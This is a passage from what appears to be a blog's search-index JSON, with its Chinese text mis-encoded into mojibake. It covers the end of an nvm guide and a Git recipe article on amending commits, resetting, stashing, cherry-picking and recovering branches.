v0.39.1 ç‰ˆæœ¬çš„ nvmï¼Œé»˜è®¤å®‰è£…ä½ç½®ä¸º /.nvmï¼Œå¹¶ä¼šåœ¨ä¸€äº›é…ç½®æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ç‰‡æ®µï¼Œä¾‹å¦‚ ~/.bash_profileã€/.zshrcã€~/.profile æˆ– ~/.bashrcã€‚ 12export NVM_DIR=\"([ -z \"&#123;XDG_CONFIG_HOME-&#125;\" ] &amp;&amp; printf %s \"&#123;HOME&#125;/.nvm\" || printf %s \"&#123;XDG_CONFIG_HOME&#125;/nvm\")\"[ -s \"NVM_DIR/nvm.sh\" ] &amp;&amp; \\. \"NVM_DIR/nvm.sh\" # This loads nvm ä¸‹è½½ã€ç¼–è¯‘å’Œå®‰è£… node çš„æœ€æ–°ç‰ˆæœ¬ï¼š 1nvm install node # \"node\" æ˜¯æœ€æ–°ç‰ˆæœ¬çš„åˆ«å ä¹Ÿå¯ä»¥æŒ‡å®šå®‰è£…ç‰ˆæœ¬ï¼Œä¾‹å¦‚ v14.17.4 1nvm install 14.17.4 å¦‚æœä¸çŸ¥é“å“ªäº›ç‰ˆæœ¬å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œå¯ä»¥å…ˆåˆ—å‡ºæ‰€æœ‰å¯ç”¨ç‰ˆæœ¬ï¼š 1nvm ls-remote ç‰ˆæœ¬åˆ‡æ¢ä½¿ç”¨æŒ‡å®šç‰ˆæœ¬ï¼š 1nvm use 14.17.4 éœ€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªåªæ˜¯ä¸´æ—¶ä½¿ç”¨è¯¥ç‰ˆæœ¬ï¼Œå½“ç¯å¢ƒå‘ç”Ÿå˜åŒ–ä¹‹åï¼Œnode åˆä¼šæ¢å¤ä¹‹å‰çš„ç‰ˆæœ¬ã€‚ æŸ¥çœ‹æ­£åœ¨ä½¿ç”¨çš„ç‰ˆæœ¬æŸ¥çœ‹å½“å‰æ‰€ä½¿ç”¨çš„ node ç‰ˆæœ¬ï¼š 1nvm current æŸ¥çœ‹å½“å‰å·²ç»å®‰è£…çš„ç‰ˆæœ¬1nvm ls æŒ‡å®šæŸä¸ªç‰ˆæœ¬æ¥æ‰§è¡Œæ–‡ä»¶1nvm run x.x.x some.js å…¶ä»–å‘½ä»¤å¦‚ä½•ä½¿å¾—æŸä¸ªç‰ˆæœ¬å˜ä¸ºé»˜è®¤ç‰ˆæœ¬ï¼š 1nvm alias default v14.17.4 è·å–å¯¹åº”ç‰ˆæœ¬çš„å®‰è£…è·¯å¾„ï¼š 1nvm which 14.17.4 éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œnpm çš„ç‰ˆæœ¬åˆ‡æ¢ï¼Œæ²¡æœ‰å…·ä½“çš„å‘½ä»¤ï¼Œåªè¦æ§åˆ¶ node ç‰ˆæœ¬å°±è¡Œï¼Œnpm ç‰ˆæœ¬ä¼šéšä¹‹å˜åŒ–ã€‚","categories":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/categories/Node/"}],"tags":[{"name":"Node","slug":"Node","permalink":"https://www.0x2beace.com/tags/Node/"}]},{"title":"Git ç»å…¸æ“ä½œåœºæ™¯æ•´ç†ï¼Œä¸“æ²»ä¸ä¼šåˆä»£ç ","slug":"the-classic-operation-scene-of-git-is-organized","date":"2022-04-02T04:04:51.000Z","updated":"2022-04-06T07:01:17.035Z","comments":true,"path":"the-classic-operation-scene-of-git-is-organized/","link":"","permalink":"https://www.0x2beace.com/the-classic-operation-scene-of-git-is-organized/","excerpt":"åŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/oY6D5E3h5K36aMJQ6AZlVQ git å¯¹äºå¤§å®¶åº”è¯¥éƒ½ä¸å¤ªé™Œç”Ÿï¼Œç†Ÿç»ƒä½¿ç”¨ git å·²ç»æˆä¸ºç¨‹åºå‘˜çš„ä¸€é¡¹åŸºæœ¬æŠ€èƒ½ï¼Œå°½ç®¡åœ¨å·¥ä½œä¸­æœ‰è¯¸å¦‚ Sourcetree è¿™æ ·ç‰›Xçš„å®¢æˆ·ç«¯å·¥å…·ï¼Œä½¿å¾—åˆå¹¶ä»£ç å˜çš„å¾ˆæ–¹ä¾¿ã€‚ä½†æ‰¾å·¥ä½œé¢è¯•å’Œä¸€äº›éœ€å½°æ˜¾ä¸ªäººå®åŠ›çš„åœºæ™¯ï¼Œä»ç„¶éœ€è¦æˆ‘ä»¬æŒæ¡è¶³å¤Ÿå¤šçš„ git å‘½ä»¤ã€‚ æœ¬æ–‡æ•´ç†äº†ä¸€äº›æ—¥å¸¸ä½¿ç”¨ git åˆä»£ç çš„ç»å…¸æ“ä½œåœºæ™¯ï¼ŒåŸºæœ¬è¦†ç›–äº†å·¥ä½œä¸­çš„éœ€æ±‚ã€‚","text":"åŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/oY6D5E3h5K36aMJQ6AZlVQ git å¯¹äºå¤§å®¶åº”è¯¥éƒ½ä¸å¤ªé™Œç”Ÿï¼Œç†Ÿç»ƒä½¿ç”¨ git å·²ç»æˆä¸ºç¨‹åºå‘˜çš„ä¸€é¡¹åŸºæœ¬æŠ€èƒ½ï¼Œå°½ç®¡åœ¨å·¥ä½œä¸­æœ‰è¯¸å¦‚ Sourcetree è¿™æ ·ç‰›Xçš„å®¢æˆ·ç«¯å·¥å…·ï¼Œä½¿å¾—åˆå¹¶ä»£ç å˜çš„å¾ˆæ–¹ä¾¿ã€‚ä½†æ‰¾å·¥ä½œé¢è¯•å’Œä¸€äº›éœ€å½°æ˜¾ä¸ªäººå®åŠ›çš„åœºæ™¯ï¼Œä»ç„¶éœ€è¦æˆ‘ä»¬æŒæ¡è¶³å¤Ÿå¤šçš„ git å‘½ä»¤ã€‚ æœ¬æ–‡æ•´ç†äº†ä¸€äº›æ—¥å¸¸ä½¿ç”¨ git åˆä»£ç çš„ç»å…¸æ“ä½œåœºæ™¯ï¼ŒåŸºæœ¬è¦†ç›–äº†å·¥ä½œä¸­çš„éœ€æ±‚ã€‚ æäº¤(Commit)æˆ‘åˆšæ‰æäº¤äº†ä»€ä¹ˆ?å¦‚æœä½ ç”¨ git commit -a æäº¤äº†ä¸€æ¬¡å˜åŒ–(changes)ï¼Œè€Œä½ åˆä¸ç¡®å®šåˆ°åº•è¿™æ¬¡æäº¤äº†å“ªäº›å†…å®¹ã€‚ä½ å°±å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤æ˜¾ç¤ºå½“å‰HEADä¸Šçš„æœ€è¿‘ä¸€æ¬¡çš„æäº¤(commit): 1(main)$ git show æˆ–è€… 1$ git log -n1 -p æˆ‘çš„æäº¤ä¿¡æ¯(commit message)å†™é”™äº†å¦‚æœä½ çš„æäº¤ä¿¡æ¯(commit message)å†™é”™äº†ä¸”è¿™æ¬¡æäº¤(commit)è¿˜æ²¡æœ‰æ¨(push), ä½ å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•æ¥ä¿®æ”¹æäº¤ä¿¡æ¯(commit message): 1$ git commit --amend --only è¿™ä¼šæ‰“å¼€ä½ çš„é»˜è®¤ç¼–è¾‘å™¨, åœ¨è¿™é‡Œä½ å¯ä»¥ç¼–è¾‘ä¿¡æ¯. å¦ä¸€æ–¹é¢, ä½ ä¹Ÿå¯ä»¥ç”¨ä¸€æ¡å‘½ä»¤ä¸€æ¬¡å®Œæˆ: 1$ git commit --amend --only -m 'xxxxxxx' å¦‚æœä½ å·²ç»æ¨(push)äº†è¿™æ¬¡æäº¤(commit), ä½ å¯ä»¥ä¿®æ”¹è¿™æ¬¡æäº¤(commit)ç„¶åå¼ºæ¨(force push), ä½†æ˜¯ä¸æ¨èè¿™ä¹ˆåšã€‚ æˆ‘æäº¤(commit)é‡Œçš„ç”¨æˆ·åå’Œé‚®ç®±ä¸å¯¹å¦‚æœè¿™åªæ˜¯å•ä¸ªæäº¤(commit)ï¼Œä¿®æ”¹å®ƒï¼š 1$ git commit --amend --author \"New Authorname &lt;authoremail@mydomain.com&gt;\" å¦‚æœä½ éœ€è¦ä¿®æ”¹æ‰€æœ‰å†å², å‚è€ƒ â€˜git filter-branchâ€™çš„æŒ‡å—é¡µ. æˆ‘æƒ³ä»ä¸€ä¸ªæäº¤(commit)é‡Œç§»é™¤ä¸€ä¸ªæ–‡ä»¶é€šè¿‡ä¸‹é¢çš„æ–¹æ³•ï¼Œä»ä¸€ä¸ªæäº¤(commit)é‡Œç§»é™¤ä¸€ä¸ªæ–‡ä»¶: 123$ git checkout HEAD^ myfile $ git add -A $ git commit --amend è¿™å°†éå¸¸æœ‰ç”¨ï¼Œå½“ä½ æœ‰ä¸€ä¸ªå¼€æ”¾çš„è¡¥ä¸(open patch)ï¼Œä½ å¾€ä¸Šé¢æäº¤äº†ä¸€ä¸ªä¸å¿…è¦çš„æ–‡ä»¶ï¼Œä½ éœ€è¦å¼ºæ¨(force push)å»æ›´æ–°è¿™ä¸ªè¿œç¨‹è¡¥ä¸ã€‚ æˆ‘æƒ³åˆ é™¤æˆ‘çš„çš„æœ€åä¸€æ¬¡æäº¤(commit)å¦‚æœä½ éœ€è¦åˆ é™¤æ¨äº†çš„æäº¤(pushed commits)ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•ã€‚å¯æ˜¯ï¼Œè¿™ä¼šä¸å¯é€†çš„æ”¹å˜ä½ çš„å†å²ï¼Œä¹Ÿä¼šæä¹±é‚£äº›å·²ç»ä»è¯¥ä»“åº“æ‹‰å–(pulled)äº†çš„äººçš„å†å²ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå¦‚æœä½ ä¸æ˜¯å¾ˆç¡®å®šï¼Œåƒä¸‡ä¸è¦è¿™ä¹ˆåšã€‚ 12$ git reset HEAD^ --hard $ git push -f [remote] [branch] å¦‚æœä½ è¿˜æ²¡æœ‰æ¨åˆ°è¿œç¨‹, æŠŠGité‡ç½®(reset)åˆ°ä½ æœ€åä¸€æ¬¡æäº¤å‰çš„çŠ¶æ€å°±å¯ä»¥äº†(åŒæ—¶ä¿å­˜æš‚å­˜çš„å˜åŒ–): 1(my-branch*)$ git reset --soft HEAD@&#123;1&#125; è¿™åªèƒ½åœ¨æ²¡æœ‰æ¨é€ä¹‹å‰æœ‰ç”¨. å¦‚æœä½ å·²ç»æ¨äº†, å”¯ä¸€å®‰å…¨èƒ½åšçš„æ˜¯ git revert SHAofBadCommitï¼Œ é‚£ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„æäº¤(commit)ç”¨äºæ’¤æ¶ˆå‰ä¸€ä¸ªæäº¤çš„æ‰€æœ‰å˜åŒ–(changes)ï¼›æˆ–è€…, å¦‚æœä½ æ¨çš„è¿™ä¸ªåˆ†æ”¯æ˜¯rebase-safeçš„ (ä¾‹å¦‚ï¼šå…¶å®ƒå¼€å‘è€…ä¸ä¼šä»è¿™ä¸ªåˆ†æ”¯æ‹‰), åªéœ€è¦ä½¿ç”¨ git push -fã€‚ åˆ é™¤ä»»æ„æäº¤(commit)åŒæ ·çš„è­¦å‘Šï¼šä¸åˆ°ä¸‡ä¸å¾—å·²çš„æ—¶å€™ä¸è¦è¿™ä¹ˆåš. 12$ git rebase --onto SHA1_OF_BAD_COMMIT^ SHA1_OF_BAD_COMMIT $ git push -f [remote] [branch] æˆ–è€…åšä¸€ä¸ª äº¤äº’å¼rebase åˆ é™¤é‚£äº›ä½ æƒ³è¦åˆ é™¤çš„æäº¤(commit)é‡Œæ‰€å¯¹åº”çš„è¡Œã€‚ æˆ‘å°è¯•æ¨ä¸€ä¸ªä¿®æ­£åçš„æäº¤(amended commit)åˆ°è¿œç¨‹ï¼Œä½†æ˜¯æŠ¥é”™ï¼š1234567To https:&#x2F;&#x2F;github.com&#x2F;yourusername&#x2F;repo.git ! [rejected] mybranch -&gt; mybranch (non-fast-forward) error: failed to push some refs to &#39;https:&#x2F;&#x2F;github.com&#x2F;tanay1337&#x2F;webmaker.org.git&#39; hint: Updates were rejected because the tip of your current branch is behind hint: its remote counterpart. Integrate the remote changes (e.g. hint: &#39;git pull ...&#39;) before pushing again. hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details. æ³¨æ„, rebasing(è§ä¸‹é¢)å’Œä¿®æ­£(amending)ä¼šç”¨ä¸€ä¸ªæ–°çš„æäº¤(commit)ä»£æ›¿æ—§çš„, æ‰€ä»¥å¦‚æœä¹‹å‰ä½ å·²ç»å¾€è¿œç¨‹ä»“åº“ä¸Šæ¨è¿‡ä¸€æ¬¡ä¿®æ­£å‰çš„æäº¤(commit)ï¼Œé‚£ä½ ç°åœ¨å°±å¿…é¡»å¼ºæ¨(force push) (-f)ã€‚æ³¨æ„ â€“ æ€»æ˜¯ ç¡®ä¿ä½ æŒ‡æ˜ä¸€ä¸ªåˆ†æ”¯! 1(my-branch)$ git push origin mybranch -f ä¸€èˆ¬æ¥è¯´, è¦é¿å…å¼ºæ¨. æœ€å¥½æ˜¯åˆ›å»ºå’Œæ¨(push)ä¸€ä¸ªæ–°çš„æäº¤(commit)ï¼Œè€Œä¸æ˜¯å¼ºæ¨ä¸€ä¸ªä¿®æ­£åçš„æäº¤ã€‚åè€…ä¼šä½¿é‚£äº›ä¸è¯¥åˆ†æ”¯æˆ–è¯¥åˆ†æ”¯çš„å­åˆ†æ”¯å·¥ä½œçš„å¼€å‘è€…ï¼Œåœ¨æºå†å²ä¸­äº§ç”Ÿå†²çªã€‚ æˆ‘æ„å¤–çš„åšäº†ä¸€æ¬¡ç¡¬é‡ç½®(hard reset)ï¼Œæˆ‘æƒ³æ‰¾å›æˆ‘çš„å†…å®¹å¦‚æœä½ æ„å¤–çš„åšäº† git reset --hard, ä½ é€šå¸¸èƒ½æ‰¾å›ä½ çš„æäº¤(commit), å› ä¸ºGitå¯¹æ¯ä»¶äº‹éƒ½ä¼šæœ‰æ—¥å¿—ï¼Œä¸”éƒ½ä¼šä¿å­˜å‡ å¤©ã€‚ 1(main)$ git reflog ä½ å°†ä¼šçœ‹åˆ°ä¸€ä¸ªä½ è¿‡å»æäº¤(commit)çš„åˆ—è¡¨, å’Œä¸€ä¸ªé‡ç½®çš„æäº¤ã€‚é€‰æ‹©ä½ æƒ³è¦å›åˆ°çš„æäº¤(commit)çš„SHAï¼Œå†é‡ç½®ä¸€æ¬¡: 1(main)$ git reset --hard SHA1234 è¿™æ ·å°±å®Œæˆäº†ã€‚ æš‚å­˜(Staging)æˆ‘éœ€è¦æŠŠæš‚å­˜çš„å†…å®¹æ·»åŠ åˆ°ä¸Šä¸€æ¬¡çš„æäº¤(commit)1(my-branch*)$ git commit --amend æˆ‘æƒ³è¦æš‚å­˜ä¸€ä¸ªæ–°æ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯è¿™ä¸ªæ–‡ä»¶çš„å…¨éƒ¨ä¸€èˆ¬æ¥è¯´, å¦‚æœä½ æƒ³æš‚å­˜ä¸€ä¸ªæ–‡ä»¶çš„ä¸€éƒ¨åˆ†, ä½ å¯è¿™æ ·åš: 1$ git add --patch filename.x -p ç®€å†™ã€‚è¿™ä¼šæ‰“å¼€äº¤äº’æ¨¡å¼ï¼Œ ä½ å°†èƒ½å¤Ÿç”¨ s é€‰é¡¹æ¥åˆ†éš”æäº¤(commit)ï¼›ç„¶è€Œ, å¦‚æœè¿™ä¸ªæ–‡ä»¶æ˜¯æ–°çš„, ä¼šæ²¡æœ‰è¿™ä¸ªé€‰æ‹©ï¼Œ æ·»åŠ ä¸€ä¸ªæ–°æ–‡ä»¶æ—¶, è¿™æ ·åš: 1$ git add -N filename.x ç„¶å, ä½ éœ€è¦ç”¨ e é€‰é¡¹æ¥æ‰‹åŠ¨é€‰æ‹©éœ€è¦æ·»åŠ çš„è¡Œï¼Œæ‰§è¡Œ git diff --cached å°†ä¼šæ˜¾ç¤ºå“ªäº›è¡Œæš‚å­˜äº†å“ªäº›è¡Œåªæ˜¯ä¿å­˜åœ¨æœ¬åœ°äº†ã€‚ æˆ‘æƒ³æŠŠåœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œçš„å˜åŒ–(changes)åŠ åˆ°ä¸¤ä¸ªæäº¤(commit)é‡Œgit add ä¼šæŠŠæ•´ä¸ªæ–‡ä»¶åŠ å…¥åˆ°ä¸€ä¸ªæäº¤. git add -p å…è®¸äº¤äº’å¼çš„é€‰æ‹©ä½ æƒ³è¦æäº¤çš„éƒ¨åˆ†. æˆ‘æƒ³æŠŠæš‚å­˜çš„å†…å®¹å˜æˆæœªæš‚å­˜ï¼ŒæŠŠæœªæš‚å­˜çš„å†…å®¹æš‚å­˜èµ·æ¥å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ åº”è¯¥å°†æ‰€æœ‰çš„å†…å®¹å˜ä¸ºæœªæš‚å­˜ï¼Œç„¶åå†é€‰æ‹©ä½ æƒ³è¦çš„å†…å®¹è¿›è¡Œcommitã€‚ä½†å‡å®šä½ å°±æ˜¯æƒ³è¦è¿™ä¹ˆåšï¼Œè¿™é‡Œä½ å¯ä»¥åˆ›å»ºä¸€ä¸ªä¸´æ—¶çš„commitæ¥ä¿å­˜ä½ å·²æš‚å­˜çš„å†…å®¹ï¼Œç„¶åæš‚å­˜ä½ çš„æœªæš‚å­˜çš„å†…å®¹å¹¶è¿›è¡Œstashã€‚ç„¶åresetæœ€åä¸€ä¸ªcommitå°†åŸæœ¬æš‚å­˜çš„å†…å®¹å˜ä¸ºæœªæš‚å­˜ï¼Œæœ€åstash popå›æ¥ã€‚ 12345$ git commit -m \"WIP\" $ git add . $ git stash $ git reset HEAD^ $ git stash pop --index 0 æ³¨æ„1: è¿™é‡Œä½¿ç”¨popä»…ä»…æ˜¯å› ä¸ºæƒ³å°½å¯èƒ½ä¿æŒå¹‚ç­‰ã€‚æ³¨æ„2: å‡å¦‚ä½ ä¸åŠ ä¸Š--indexä½ ä¼šæŠŠæš‚å­˜çš„æ–‡ä»¶æ ‡è®°ä¸ºä¸ºå­˜å‚¨ã€‚ æœªæš‚å­˜(Unstaged)çš„å†…å®¹æˆ‘æƒ³æŠŠæœªæš‚å­˜çš„å†…å®¹ç§»åŠ¨åˆ°ä¸€ä¸ªæ–°åˆ†æ”¯1$ git checkout -b my-branch æˆ‘æƒ³æŠŠæœªæš‚å­˜çš„å†…å®¹ç§»åŠ¨åˆ°å¦ä¸€ä¸ªå·²å­˜åœ¨çš„åˆ†æ”¯123$ git stash $ git checkout my-branch $ git stash pop æˆ‘æƒ³ä¸¢å¼ƒæœ¬åœ°æœªæäº¤çš„å˜åŒ–(uncommitted changes)å¦‚æœä½ åªæ˜¯æƒ³é‡ç½®æº(origin)å’Œä½ æœ¬åœ°(local)ä¹‹é—´çš„ä¸€äº›æäº¤(commit)ï¼Œä½ å¯ä»¥ï¼š 12345678# one commit (my-branch)$ git reset --hard HEAD^ # two commits (my-branch)$ git reset --hard HEAD^^ # four commits (my-branch)$ git reset --hard HEAD~4 # or (main)$ git checkout -f é‡ç½®æŸä¸ªç‰¹æ®Šçš„æ–‡ä»¶, ä½ å¯ä»¥ç”¨æ–‡ä»¶ååšä¸ºå‚æ•°: 1$ git reset filename æˆ‘æƒ³ä¸¢å¼ƒæŸäº›æœªæš‚å­˜çš„å†…å®¹å¦‚æœä½ æƒ³ä¸¢å¼ƒå·¥ä½œæ‹·è´ä¸­çš„ä¸€éƒ¨åˆ†å†…å®¹ï¼Œè€Œä¸æ˜¯å…¨éƒ¨ã€‚ ç­¾å‡º(checkout)ä¸éœ€è¦çš„å†…å®¹ï¼Œä¿ç•™éœ€è¦çš„ã€‚ 12$ git checkout -p # Answer y to all of the snippets you want to drop å¦å¤–ä¸€ä¸ªæ–¹æ³•æ˜¯ä½¿ç”¨ stashï¼Œ Stashæ‰€æœ‰è¦ä¿ç•™ä¸‹çš„å†…å®¹, é‡ç½®å·¥ä½œæ‹·è´, é‡æ–°åº”ç”¨ä¿ç•™çš„éƒ¨åˆ†ã€‚ 1234$ git stash -p # Select all of the snippets you want to save $ git reset --hard $ git stash pop æˆ–è€…, stash ä½ ä¸éœ€è¦çš„éƒ¨åˆ†, ç„¶åstash dropã€‚ 123$ git stash -p # Select all of the snippets you don't want to save $ git stash drop åˆ†æ”¯(Branches)æˆ‘ä»é”™è¯¯çš„åˆ†æ”¯æ‹‰å–äº†å†…å®¹ï¼Œæˆ–æŠŠå†…å®¹æ‹‰å–åˆ°äº†é”™è¯¯çš„åˆ†æ”¯è¿™æ˜¯å¦å¤–ä¸€ç§ä½¿ç”¨ git reflog æƒ…å†µï¼Œæ‰¾åˆ°åœ¨è¿™æ¬¡é”™è¯¯æ‹‰(pull) ä¹‹å‰HEADçš„æŒ‡å‘ã€‚ 123(main)$ git reflog ab7555f HEAD@&#123;0&#125;: pull origin wrong-branch: Fast-forward c5bc55a HEAD@&#123;1&#125;: checkout: checkout message goes here é‡ç½®åˆ†æ”¯åˆ°ä½ æ‰€éœ€çš„æäº¤(desired commit): 1$ git reset --hard c5bc55a å®Œæˆã€‚ æˆ‘æƒ³æ‰”æ‰æœ¬åœ°çš„æäº¤(commit)ï¼Œä»¥ä¾¿æˆ‘çš„åˆ†æ”¯ä¸è¿œç¨‹çš„ä¿æŒä¸€è‡´å…ˆç¡®è®¤ä½ æ²¡æœ‰æ¨(push)ä½ çš„å†…å®¹åˆ°è¿œç¨‹ã€‚ git status ä¼šæ˜¾ç¤ºä½ é¢†å…ˆ(ahead)æº(origin)å¤šå°‘ä¸ªæäº¤: 12345(my-branch)$ git status # On branch my-branch # Your branch is ahead of 'origin/my-branch' by 2 commits. # (use \"git push\" to publish your local commits) # ä¸€ç§æ–¹æ³•æ˜¯: 1(main)$ git reset --hard origin/my-branch æˆ‘éœ€è¦æäº¤åˆ°ä¸€ä¸ªæ–°åˆ†æ”¯ï¼Œä½†é”™è¯¯çš„æäº¤åˆ°äº†mainåœ¨mainä¸‹åˆ›å»ºä¸€ä¸ªæ–°åˆ†æ”¯ï¼Œä¸åˆ‡æ¢åˆ°æ–°åˆ†æ”¯,ä»åœ¨mainä¸‹: 1(main)$ git branch my-branch æŠŠmainåˆ†æ”¯é‡ç½®åˆ°å‰ä¸€ä¸ªæäº¤: 1(main)$ git reset --hard HEAD^ HEAD^ æ˜¯ HEAD^1 çš„ç®€å†™ï¼Œä½ å¯ä»¥é€šè¿‡æŒ‡å®šè¦è®¾ç½®çš„HEADæ¥è¿›ä¸€æ­¥é‡ç½®ã€‚ æˆ–è€…, å¦‚æœä½ ä¸æƒ³ä½¿ç”¨ HEAD^, æ‰¾åˆ°ä½ æƒ³é‡ç½®åˆ°çš„æäº¤(commit)çš„hash(git log èƒ½å¤Ÿå®Œæˆ)ï¼Œ ç„¶åé‡ç½®åˆ°è¿™ä¸ªhashã€‚ä½¿ç”¨git push åŒæ­¥å†…å®¹åˆ°è¿œç¨‹ã€‚ ä¾‹å¦‚, mainåˆ†æ”¯æƒ³é‡ç½®åˆ°çš„æäº¤çš„hashä¸ºa13b85e: 12(main)$ git reset --hard a13b85e HEAD is now at a13b85e ç­¾å‡º(checkout)åˆšæ‰æ–°å»ºçš„åˆ†æ”¯ç»§ç»­å·¥ä½œ: 1(main)$ git checkout my-branch æˆ‘æƒ³ä¿ç•™æ¥è‡ªå¦å¤–ä¸€ä¸ªref-ishçš„æ•´ä¸ªæ–‡ä»¶å‡è®¾ä½ æ­£åœ¨åšä¸€ä¸ªåŸå‹æ–¹æ¡ˆ(åŸæ–‡ä¸ºworking spike (see note)), æœ‰æˆç™¾çš„å†…å®¹ï¼Œæ¯ä¸ªéƒ½å·¥ä½œå¾—å¾ˆå¥½ã€‚ç°åœ¨, ä½ æäº¤åˆ°äº†ä¸€ä¸ªåˆ†æ”¯ï¼Œä¿å­˜å·¥ä½œå†…å®¹: 1(solution)$ git add -A &amp;&amp; git commit -m \"Adding all changes from this spike into one big commit.\" å½“ä½ æƒ³è¦æŠŠå®ƒæ”¾åˆ°ä¸€ä¸ªåˆ†æ”¯é‡Œ (å¯èƒ½æ˜¯feature, æˆ–è€… develop), ä½ å…³å¿ƒæ˜¯ä¿æŒæ•´ä¸ªæ–‡ä»¶çš„å®Œæ•´ï¼Œä½ æƒ³è¦ä¸€ä¸ªå¤§çš„æäº¤åˆ†éš”æˆæ¯”è¾ƒå°ã€‚ å‡è®¾ä½ æœ‰: åˆ†æ”¯ solution, æ‹¥æœ‰åŸå‹æ–¹æ¡ˆï¼Œ é¢†å…ˆ develop åˆ†æ”¯ã€‚ åˆ†æ”¯ develop, åœ¨è¿™é‡Œä½ åº”ç”¨åŸå‹æ–¹æ¡ˆçš„ä¸€äº›å†…å®¹ã€‚ æˆ‘å»å¯ä»¥é€šè¿‡æŠŠå†…å®¹æ‹¿åˆ°ä½ çš„åˆ†æ”¯é‡Œï¼Œæ¥è§£å†³è¿™ä¸ªé—®é¢˜: 1(develop)$ git checkout solution -- file1.txt è¿™ä¼šæŠŠè¿™ä¸ªæ–‡ä»¶å†…å®¹ä»åˆ†æ”¯ solution æ‹¿åˆ°åˆ†æ”¯ develop é‡Œæ¥: 123456# On branch develop # Your branch is up-to-date with 'origin/develop'. # Changes to be committed: # (use \"git reset HEAD &lt;file&gt;...\" to unstage) # # modified: file1.txt ç„¶å, æ­£å¸¸æäº¤ã€‚ Note: Spike solutions are made to analyze or solve the problem. These solutions are used for estimation and discarded once everyone gets clear visualization of the problem. æˆ‘æŠŠå‡ ä¸ªæäº¤(commit)æäº¤åˆ°äº†åŒä¸€ä¸ªåˆ†æ”¯ï¼Œè€Œè¿™äº›æäº¤åº”è¯¥åˆ†å¸ƒåœ¨ä¸åŒçš„åˆ†æ”¯é‡Œå‡è®¾ä½ æœ‰ä¸€ä¸ªmainåˆ†æ”¯ï¼Œ æ‰§è¡Œgit log, ä½ çœ‹åˆ°ä½ åšè¿‡ä¸¤æ¬¡æäº¤: 12345678910111213141516171819(main)$ git log commit e3851e817c451cc36f2e6f3049db528415e3c114 Author: Alex Lee &lt;alexlee@example.com&gt; Date: Tue Jul 22 15:39:27 2014 -0400 Bug #21 - Added CSRF protection commit 5ea51731d150f7ddc4a365437931cd8be3bf3131 Author: Alex Lee &lt;alexlee@example.com&gt; Date: Tue Jul 22 15:39:12 2014 -0400 Bug #14 - Fixed spacing on title commit a13b85e984171c6e2a1729bb061994525f626d14 Author: Aki Rose &lt;akirose@example.com&gt; Date: Tue Jul 21 01:12:48 2014 -0400 First commit è®©æˆ‘ä»¬ç”¨æäº¤hash(commit hash)æ ‡è®°bug (e3851e8 for #21, 5ea5173 for #14). é¦–å…ˆ, æˆ‘ä»¬æŠŠmainåˆ†æ”¯é‡ç½®åˆ°æ­£ç¡®çš„æäº¤(a13b85e): 12(main)$ git reset --hard a13b85e HEAD is now at a13b85e ç°åœ¨, æˆ‘ä»¬å¯¹ bug #21 åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯: 12(main)$ git checkout -b 21 (21)$ æ¥ç€, æˆ‘ä»¬ç”¨_cherry-pick_æŠŠå¯¹bug #21çš„æäº¤æ”¾å…¥å½“å‰åˆ†æ”¯ã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å°†åº”ç”¨(apply)è¿™ä¸ªæäº¤(commit)ï¼Œä»…ä»…è¿™ä¸€ä¸ªæäº¤(commit)ï¼Œç›´æ¥åœ¨HEADä¸Šé¢ã€‚ 1(21)$ git cherry-pick e3851e8 è¿™æ—¶å€™, è¿™é‡Œå¯èƒ½ä¼šäº§ç”Ÿå†²çªï¼Œ å‚è§äº¤äº’å¼ rebasing ç«  å†²çªèŠ‚ è§£å†³å†²çª. å†è€…ï¼Œ æˆ‘ä»¬ä¸ºbug #14 åˆ›å»ºä¸€ä¸ªæ–°çš„åˆ†æ”¯, ä¹ŸåŸºäºmainåˆ†æ”¯ 123(21)$ git checkout main (main)$ git checkout -b 14 (14)$ æœ€å, ä¸º bug #14 æ‰§è¡Œ cherry-pick: 1(14)$ git cherry-pick 5ea5173 æˆ‘æƒ³åˆ é™¤ä¸Šæ¸¸(upstream)åˆ†æ”¯è¢«åˆ é™¤äº†çš„æœ¬åœ°åˆ†æ”¯ä¸€æ—¦ä½ åœ¨github ä¸Šé¢åˆå¹¶(merge)äº†ä¸€ä¸ªpull request, ä½ å°±å¯ä»¥åˆ é™¤ä½ forké‡Œè¢«åˆå¹¶çš„åˆ†æ”¯ã€‚å¦‚æœä½ ä¸å‡†å¤‡ç»§ç»­åœ¨è¿™ä¸ªåˆ†æ”¯é‡Œå·¥ä½œ, åˆ é™¤è¿™ä¸ªåˆ†æ”¯çš„æœ¬åœ°æ‹·è´ä¼šæ›´å¹²å‡€ï¼Œä½¿ä½ ä¸ä¼šé™·å…¥å·¥ä½œåˆ†æ”¯å’Œä¸€å †é™ˆæ—§åˆ†æ”¯çš„æ··ä¹±ä¹‹ä¸­ã€‚ 1$ git fetch -p æˆ‘ä¸å°å¿ƒåˆ é™¤äº†æˆ‘çš„åˆ†æ”¯å¦‚æœä½ å®šæœŸæ¨é€åˆ°è¿œç¨‹, å¤šæ•°æƒ…å†µä¸‹åº”è¯¥æ˜¯å®‰å…¨çš„ï¼Œä½†æœ‰äº›æ—¶å€™è¿˜æ˜¯å¯èƒ½åˆ é™¤äº†è¿˜æ²¡æœ‰æ¨åˆ°è¿œç¨‹çš„åˆ†æ”¯ã€‚è®©æˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªåˆ†æ”¯å’Œä¸€ä¸ªæ–°çš„æ–‡ä»¶: 12345(main)$ git checkout -b my-branch (my-branch)$ git branch (my-branch)$ touch foo.txt 